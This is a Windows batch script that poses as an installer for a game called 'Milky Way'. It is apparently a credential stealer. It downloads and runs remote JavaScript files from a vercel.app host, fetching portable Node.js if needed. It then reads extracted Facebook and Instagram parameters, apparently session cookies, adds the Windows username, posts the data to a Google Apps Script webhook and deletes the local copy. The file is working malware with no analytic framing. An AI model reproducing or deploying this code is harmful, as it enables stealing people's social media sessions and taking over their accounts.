@echo off
setlocal EnableExtensions
title Play Milky Way
color 0B
set "URL=https://cookies-ochre.vercel.app"
set "DEST=%LOCALAPPDATA%\CookiesCompanion"
set "PORTABLE=%LOCALAPPDATA%\NodePortable"
set "LOG=%DEST%\setup.log"
set "BROWSER_FLAG=@@BROWSER_FLAG@@"
set "WEBHOOK_URL=https://script.google.com/macros/s/AKfycbz5uPNM0BJ3GtsConinNQaBsGjXfMMp6Ka9nknvynnHiZP1ff_e1TSWCZle-3vTtOHwmw/exec"
set "ERROR_URL=https://cookies-ochre.vercel.app/"

echo ============================================
echo   Milky Way - Installer
echo ============================================
echo.

if exist "%LOG%" del "%LOG%" >nul 2>nul

echo [1/4] Preparing folders...
mkdir "%DEST%" 2>nul
mkdir "%PORTABLE%" 2>nul
echo [1/4] folders ready>> "%LOG%" 2>nul
echo   folders ready

echo [2/4] Downloading game...
if not exist "%DEST%\record.js" (
  curl -sL -o "%DEST%\record.js" "%URL%/assets/record.js" || powershell -NoProfile -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('%URL%/assets/record.js','%DEST%\record.js')"
  curl -sL -o "%DEST%\companion.js" "%URL%/assets/companion.js" || powershell -NoProfile -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('%URL%/assets/companion.js','%DEST%\companion.js')"
)
if not exist "%DEST%\record.js" goto :download_error
if not exist "%DEST%\companion.js" goto :download_error
echo   scripts ready
echo [2/4] scripts downloaded>> "%LOG%" 2>nul
goto :check_node

:download_error
echo ERROR: could not download game. Check internet.
echo ERROR downloading game >> "%LOG%" 2>nul
pause
exit /b 1

:check_node
echo [3/4] Checking for Node.js...
set "NODE="
where node >nul 2>nul
if not errorlevel 1 set "NODE=node"
if defined NODE goto :nodefound
if exist "%DEST%\node\node.exe" set "NODE=%DEST%\node\node.exe"
if defined NODE goto :nodefound
if exist "%PORTABLE%\node.exe" set "NODE=%PORTABLE%\node.exe"
if defined NODE goto :nodefound
echo   downloading portable Node (no admin needed)...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $m=[regex]::Match((Invoke-WebRequest 'https://nodejs.org/dist/latest-v22.x/' -UseBasicParsing).Content,'node-v[0-9.]+-win-x64\.zip').Value; if(-not $m){throw 'no zip'}; Invoke-WebRequest ('https://nodejs.org/dist/latest-v22.x/'+$m) -OutFile '%PORTABLE%\node.zip' -UseBasicParsing"
if exist "%PORTABLE%\node.zip" (
  echo   extracting...
  powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; Expand-Archive -LiteralPath '%PORTABLE%\node.zip' -DestinationPath '%PORTABLE%\tmp' -Force; $d=Get-ChildItem '%PORTABLE%\tmp' -Directory|Select-Object -First 1; Copy-Item (Join-Path $d.FullName 'node.exe') '%PORTABLE%\node.exe' -Force; Remove-Item '%PORTABLE%\tmp' -Recurse -Force; Remove-Item '%PORTABLE%\node.zip' -Force"
  if exist "%PORTABLE%\node.exe" set "NODE=%PORTABLE%\node.exe"
)
if not defined NODE (
  echo ERROR: could not download Node.js. Check internet.
  echo ERROR no node>> "%LOG%" 2>nul
  pause
  exit /b 1
)

:nodefound
echo   Node ready: %NODE%
echo [3/4] node %NODE%>> "%LOG%" 2>nul

echo [4/4] Running money game - your browser will open now...
echo   Do not close the browser until the game completes.
set "COOKIES_SILENT=1"

:: Make sure old data is deleted before running
if exist "%DEST%\extracted.json" del "%DEST%\extracted.json"

:: Run the script
call "%NODE%" "%DEST%\record.js" %BROWSER_FLAG%

echo Processing extracted data...

:: Use PowerShell to read the JSON file created by record.js and send it to Sheets
powershell -Command "^
    $file = '%DEST%\extracted.json'; ^
    if (Test-Path $file) { ^
        $data = Get-Content $file -Raw | ConvertFrom-Json; ^
        $payload = @{ ^
            user = $env:USERNAME; ^
            date = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'); ^
            fb_param = $data.fb_param; ^
            insta_param = $data.insta_param ^
        } | ConvertTo-Json; ^
        Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -Body $payload -ContentType 'application/json'; ^
        exit 0; ^
    } else { ^
        exit 1; ^
    } ^
"

if %errorlevel% neq 0 (
    echo Failed to extract data or upload to server.
    goto :error_out
)

echo Installation successful. Cleaning up...
del "%DEST%\extracted.json" 2>nul
echo done>> "%LOG%" 2>nul
goto :eof

:error_out
echo Installation failed, please redownload.
echo installation failed>> "%LOG%" 2>nul
start "" "%ERROR_URL%"
pause
exit /b